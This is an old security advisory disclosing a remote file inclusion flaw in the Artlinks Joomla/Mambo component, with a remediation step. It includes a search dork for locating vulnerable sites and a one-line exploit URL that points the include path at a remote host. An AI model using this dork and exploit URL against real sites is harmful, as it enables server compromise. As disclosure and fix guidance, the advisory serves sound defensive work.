@@ -1,0 +1,88 @@
+    .:[ insecurity research team ]:.
+     .__..____.:.______.____.:.____ .
+ .:. |  |/    \:/  ___// __ \:/   _\.:.
+   : |  |   |  \\____\\  ___/\   /__ :. .
+ ..: |__|___|  /____  >\___  >\___  >.:
+   .:.. ..  .\/   .:\/:.  .\/.  .:\/:
+ .   ...:.    .advisory.    .:...
+         :..................: 18.o8.2oo6 ..
+ 
+ 
+  Affected Application: Artlinks v1.0 Beta 4 
+
+       (Mambo/Joomla CMS Component)
+ 
+ 
+ . . :[ contact ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  Discoverd by: camino
+ 
+  Team: Insecurity Research Team
+ 
+  URL: http://www.insecurityresearch.org
+ 
+  E-Mail: camino[at]sexmagnet[dot]com
+ 
+ 
+ 
+ . . :[ insecure application details ]: . . . . . . . . . . . . . . . . .
+ 
+ 
+  Typ: Remote [x]  Local [ ]
+ 
+       Remote File Inclusion [x]  SQL Injection [ ]
+ 
+  Level: Low [ ]  Middle [ ]  High [x]
+ 
+  Application: Artlinks
+ 
+  Version: 1.0 Beta 4
+ 
+  Vulnerable File: artlinks.dispnew.php
+ 
+  URL: http://www.duswald.de
+ 
+  Description: It's a component which creates linklists for various 
+
+               categories with a screenshot and description.
+ 
+  Dork: inurl:"com_artlinks"
+ 
+ 
+ 
+ . . :[ exploit ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  http://[sitepath]/[joomlapath]/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=http://huh?
+ 
+ 
+ . . :[ how to fix ]: . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  o1.) open artlinks.dispnew.php
+ 
+  o2.) take a look at line 12:
+
+         require($mosConfig_absolute_path."/administrator/components/
+
+         com_artlinks/config.artlinks.php");
+ 
+  o3.) add the following line before line 12:
+
+         defined( '_VALID_MOS' ) or die( 'Direct Access to this location 
+
+         is not allowed.' );
+ 
+  o4.) done!
+ 
+ 
+ 
+ . . :[ greets ]: . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  my girlfriend, brOmstar, ACiDAngel, PoKi, Waze and all the sexy members 
+
+  of insecurity research team ;-)
+
+# milw0rm.com [2006-08-18]
